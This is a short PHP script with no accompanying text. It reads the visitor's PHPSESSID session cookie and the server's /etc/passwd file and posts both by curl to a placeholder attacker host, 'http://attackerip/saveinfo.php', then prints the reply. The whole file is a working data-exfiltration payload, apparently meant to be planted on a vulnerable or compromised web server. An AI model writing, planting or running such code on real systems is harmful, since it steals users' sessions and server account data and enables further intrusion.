<?php

    $url = 'http://attackerip/saveinfo.php';

    $cookie = $_COOKIE['PHPSESSID'];
    $passwd = file_get_contents("/etc/passwd");
    $myvars = "cookie=$cookie" . "&passwd=$passwd";
    $conn = curl_init( $url );

    curl_setopt($conn, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($conn, CURLOPT_POST, 1);
    curl_setopt($conn, CURLOPT_POSTFIELDS, $myvars);
    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($conn, CURLOPT_HEADER, 0);
    curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);

    $response = curl_exec($conn);
    curl_close($conn);

    echo "<pre>response: \n" . $response  . "</pre>"

?>
